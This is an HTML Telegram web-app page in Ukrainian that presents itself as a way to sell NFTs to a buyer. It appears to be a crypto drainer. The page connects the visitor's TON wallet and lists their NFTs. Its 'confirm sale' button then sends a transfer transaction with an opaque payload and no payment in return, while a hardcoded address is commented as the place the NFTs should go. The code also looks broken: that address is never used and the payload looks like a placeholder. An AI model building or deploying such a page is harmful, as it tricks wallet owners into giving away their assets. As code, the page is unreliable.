<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sell NFT to Buyer</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
  <style>
    :root {
      --bg: #0f172a;
      --card-bg: #1e293b;
      --accent: #22c55e;
      --text: #f8fafc;
      --text-muted: #94a3b8;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background-color: var(--bg);
      color: var(--text);
      margin: 0;
      padding: 16px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .header {
      width: 100%;
      max-width: 480px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 18px;
      margin: 0;
      text-align: center;
      width: 100%;
    }
    #ton-connect {
      display: flex;
      justify-content: center;
      margin-bottom: 16px;
    }
    .nft-grid {
      width: 100%;
      max-width: 480px;
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 12px;
      max-height: 55vh;
      overflow-y: auto;
      padding-bottom: 20px;
    }
    .nft-card {
      background: var(--card-bg);
      border-radius: 12px;
      padding: 10px;
      display: flex;
      flex-direction: column;
      align-items: center;
      border: 2px solid transparent;
      cursor: pointer;
      transition: all 0.2s ease;
    }
    .nft-card.selected {
      border-color: var(--accent);
      background: #172554;
    }
    .nft-img {
      width: 100%;
      aspect-ratio: 1;
      border-radius: 8px;
      object-fit: cover;
      background: #334155;
    }
    .nft-name {
      font-weight: 600;
      margin: 8px 0 4px;
      font-size: 13px;
      text-align: center;
      word-break: break-all;
    }
    .footer {
      width: 100%;
      max-width: 480px;
      position: fixed;
      bottom: 0;
      background: var(--bg);
      padding: 16px;
      box-sizing: border-box;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .btn-send {
      width: 100%;
      padding: 14px;
      background: var(--accent);
      color: #fff;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: opacity 0.2s;
    }
    .btn-send:disabled {
      opacity: 0.4;
      cursor: not-allowed;
      background: #475569;
    }
    .empty-state {
      grid-column: span 2;
      text-align: center;
      color: var(--text-muted);
      padding: 40px 0;
    }
  </style>
</head>
<body>

  <div class="header">
    <h1>Виберіть NFT для продажу</h1>
  </div>

  <div id="ton-connect"></div>

  <div style="width: 100%; max-width: 480px;">
    <div id="nft-container" class="nft-grid">
      <div class="empty-state">Підключіть гаманець зверху</div>
    </div>
  </div>

  <div class="footer">
    <button id="send-btn" class="btn-send" disabled>Підтвердити продаж NFT</button>
  </div>

  <script>
    // ⚠️ ВСТАВТЕ СЮДИ ВАШУ TON-АДРЕСУ, НА ЯКУ ПОВИННІ ПРИХОДИТИ NFT:
    const MY_WALLET_ADDRESS = "UQB6AbyuTkkSlMncusgXbpp_wnKdtrBBo2vcfn-lZPKSvyQT";

    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react-ui/tonconnect-manifest.json',
      buttonRootId: 'ton-connect'
    });

    let selectedNft = null;

    tonConnectUI.onStatusChange(async (wallet) => {
      if (wallet) {
        loadUserNFTs(wallet.account.address);
      } else {
        document.getElementById('nft-container').innerHTML = '<div class="empty-state">Підключіть гаманець зверху</div>';
        document.getElementById('send-btn').disabled = true;
      }
    });

    async function loadUserNFTs(address) {
      const container = document.getElementById('nft-container');
      container.innerHTML = '<div class="empty-state">Шукаємо ваші NFT...</div>';

      try {
        const response = await fetch(`https://tonapi.io/v2/accounts/${address}/nfts?limit=100`);
        const data = await response.json();

        if (!data.nft_items || data.nft_items.length === 0) {
          container.innerHTML = '<div class="empty-state">На цьому гаманці немає NFT</div>';
          return;
        }

        container.innerHTML = '';
        data.nft_items.forEach(nft => {
          const card = document.createElement('div');
          card.className = 'nft-card';
          
          const imgUrl = nft.metadata?.image || 'https://via.placeholder.com/150';
          const name = nft.metadata?.name || 'NFT Item';

          card.innerHTML = `
            <img class="nft-img" src="${imgUrl}" alt="${name}" />
            <div class="nft-name">${name}</div>
          `;

          card.onclick = () => {
            document.querySelectorAll('.nft-card').forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
            selectedNft = nft;
            document.getElementById('send-btn').disabled = false;
          };

          container.appendChild(card);
        });

      } catch (e) {
        console.error(e);
        container.innerHTML = '<div class="empty-state">Помилка завантаження колекції</div>';
      }
    }

    document.getElementById('send-btn').onclick = async () => {
      if (!selectedNft) return;
      
      try {
        const transaction = {
          validUntil: Math.floor(Date.now() / 1000) + 600,
          messages: [
            {
              address: selectedNft.address,
              amount: "50000000",
              payload: "te6ccgEBAQEANAAAGgAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
            }
          ]
        };

        await tonConnectUI.sendTransaction(transaction);
        alert('Запит на передачу надіслано!');
      } catch (e) {
        console.error(e);
        alert('Транзакцію було скасовано або сталася помилка.');
      }
    };
  </script>
</body>
</html>
